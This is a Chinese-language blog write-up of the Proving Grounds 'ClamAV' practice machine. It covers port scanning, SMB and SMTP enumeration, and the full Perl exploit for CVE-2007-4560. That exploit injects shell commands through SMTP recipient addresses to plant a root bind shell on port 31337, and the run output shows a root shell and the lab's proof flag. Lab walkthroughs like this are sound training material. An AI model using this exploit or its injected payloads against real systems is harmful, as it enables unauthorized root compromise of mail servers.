# ProvingGrouds ClamAV WriteUp


## ClamAV

第8台，Linux系统，难度Easy，名称 ClamAV



## 端口扫描

```sh
┌──(xavier㉿kali)-[~]
└─$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.193.42 -T4                           
[sudo] xavier 的密码：
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-17 14:18 CST
Nmap scan report for 192.168.193.42
Host is up (0.16s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
25/tcp  open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
80/tcp  open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp open  smux        Linux SNMP multiplexer
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.94 seconds

全端口扫描，补充端口如下：
60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
```



漏洞情况：

```sh
Apache 1.3.34/1.3.33 (Ubuntu / Debian) - CGI TTY Privilege Escalation
```



## Web

打开80端口，能看到字符串

```sh
01101001 01100110 01111001 01101111 01110101 01100100 01101111 01101110 01110100 01110000 01110111 01101110 01101101 01100101 01110101 01110010 01100001 01101110 00110000 00110000 01100010 
```

二进制解码后就是：

```
ifyoudontpwnmeuran00b
```



## SMB

探测SMB空口令成功

```sh
┌──(xavier㉿kali)-[~]
└─$ crackmapexec smb 192.168.193.42 -u &#39;&#39; -p &#39;&#39;             
SMB         192.168.193.42  445    NONE             [*] Unix (name:) (domain:) (signing:False) (SMBv1:True)
SMB         192.168.193.42  445    NONE             [&#43;] \: 

┌──(xavier㉿kali)-[~]
└─$ crackmapexec smb 192.168.193.42 -u &#39;&#39; -p &#39;&#39; --shares
SMB         192.168.193.42  445    NONE             [*] Unix (name:) (domain:) (signing:False) (SMBv1:True)
SMB         192.168.193.42  445    NONE             [&#43;] \: 
SMB         192.168.193.42  445    NONE             [&#43;] Enumerated shares
SMB         192.168.193.42  445    NONE             Share           Permissions     Remark
SMB         192.168.193.42  445    NONE             -----           -----------     ------
SMB         192.168.193.42  445    NONE             print$                          Printer Drivers
SMB         192.168.193.42  445    NONE             IPC$                            IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
SMB         192.168.193.42  445    NONE             ADMIN$                          IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
```



## SMTP

```sh
┌──(xavier㉿kali)-[~]
└─$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.193.42 -T4 -p 25 --script=smtp*
[sudo] xavier 的密码：
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-17 14:40 CST
Nmap scan report for 192.168.193.42
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-enum-users: 
|   root
|   admin
|   administrator
|   webadmin
|   sysadmin
|   netadmin
|   guest
|   user
|   web
|_  test
|_smtp-open-relay: Server is an open relay (13/16 tests)
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
| smtp-commands: localhost.localdomain Hello [192.168.45.174], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use &#34;HELP &lt;topic&gt;&#34;. 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
Service Info: Host: localhost.localdomain; OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.83 seconds
```



漏洞搜索

搜索box的名称，找到历史漏洞

```sh
┌──(xavier㉿kali)-[~]
└─$ searchsploit clamav
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Clam Anti-Virus ClamAV 0.88.x - UPX Compressed PE File Heap Buffer Ov | linux/dos/28348.txt
ClamAV / UnRAR - .RAR Handling Remote Null Pointer Dereference        | linux/remote/30291.txt
ClamAV 0.91.2 - libclamav MEW PE Buffer Overflow                      | linux/remote/4862.py
ClamAV &lt; 0.102.0 - &#39;bytecode_vm&#39; Code Execution                       | linux/local/47687.py
ClamAV &lt; 0.94.2 - JPEG Parsing Recursive Stack Overflow (PoC)         | multiple/dos/7330.c
ClamAV Daemon 0.65 - UUEncoded Message Denial of Service              | linux/dos/23667.txt
ClamAV Milter - Blackhole-Mode Remote Code Execution (Metasploit)     | linux/remote/16924.rb
ClamAV Milter 0.92.2 - Blackhole-Mode (Sendmail) Code Execution (Meta | multiple/remote/9913.rb
Sendmail with clamav-milter &lt; 0.91.2 - Remote Command Execution       | multiple/remote/4761.pl
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
---------------------------------------------------------------------- ---------------------------------
 Paper Title                                                          |  Path
---------------------------------------------------------------------- ---------------------------------
[Azerbaijan] ClamAV Bypassing                                         | docs/azerbaijan/31685-[azerbaija
---------------------------------------------------------------------- ---------------------------------
 
```



```sh
┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/8-ClamAV]
└─$ searchsploit -m 4761 
  Exploit: Sendmail with clamav-milter &lt; 0.91.2 - Remote Command Execution
      URL: https://www.exploit-db.com/exploits/4761
     Path: /usr/share/exploitdb/exploits/multiple/remote/4761.pl
    Codes: CVE-2007-4560
 Verified: True
File Type: ASCII text
Copied to: /home/xavier/Desktop/OSCP/PG_Practice/8-ClamAV/4761.pl
```



```perl
### black-hole.pl
### Sendmail w/ clamav-milter Remote Root Exploit
### Copyright (c) 2007 Eliteboy
########################################################
use IO::Socket;

print &#34;Sendmail w/ clamav-milter Remote Root Exploit\n&#34;;
print &#34;Copyright (C) 2007 Eliteboy\n&#34;;

if ($#ARGV != 0) {print &#34;Give me a host to connect.\n&#34;;exit;}

print &#34;Attacking $ARGV[0]...\n&#34;;

$sock = IO::Socket::INET-&gt;new(PeerAddr =&gt; $ARGV[0],
                              PeerPort =&gt; &#39;25&#39;,
                              Proto    =&gt; &#39;tcp&#39;);

print $sock &#34;ehlo you\r\n&#34;;
print $sock &#34;mail from: &lt;&gt;\r\n&#34;;
print $sock &#34;rcpt to: &lt;nobody&#43;\&#34;|echo &#39;31337 stream tcp nowait root /bin/sh -i&#39; &gt;&gt; /etc/inetd.conf\&#34;@localhost&gt;\r\n&#34;;
print $sock &#34;rcpt to: &lt;nobody&#43;\&#34;|/etc/init.d/inetd restart\&#34;@localhost&gt;\r\n&#34;;
print $sock &#34;data\r\n.\r\nquit\r\n&#34;;

while (&lt;$sock&gt;) {
        print;
}

# milw0rm.com [2007-12-21]
```

该脚本执行后，会用root权限执行一个/bin/sh ，在31337端口进行监听

```sh
┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/8-ClamAV]
└─$ perl 4761.pl 192.168.193.42
Sendmail w/ clamav-milter Remote Root Exploit
Copyright (C) 2007 Eliteboy
Attacking 192.168.193.42...
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Sun, 17 Dec 2023 07:11:16 -0500; (No UCE/UBE) logging access from: [192.168.45.174](FAIL)-[192.168.45.174]
250-localhost.localdomain Hello [192.168.45.174], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-DELIVERBY
250 HELP
250 2.1.0 &lt;&gt;... Sender ok
250 2.1.5 &lt;nobody&#43;&#34;|echo &#39;31337 stream tcp nowait root /bin/sh -i&#39; &gt;&gt; /etc/inetd.conf&#34;&gt;... Recipient ok
250 2.1.5 &lt;nobody&#43;&#34;|/etc/init.d/inetd restart&#34;&gt;... Recipient ok
354 Enter mail, end with &#34;.&#34; on a line by itself
250 2.0.0 3BHCBGXD005199 Message accepted for delivery
221 2.0.0 localhost.localdomain closing connection

┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/8-ClamAV]
└─$ nc 192.168.193.42 31337 
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/proof.txt
09d91935b96ac1aa8ce31d30e77c9978
```



---

> 作者: Xavier  
> URL: https://www.bthoughts.top/posts/provinggrounds-clamav/  

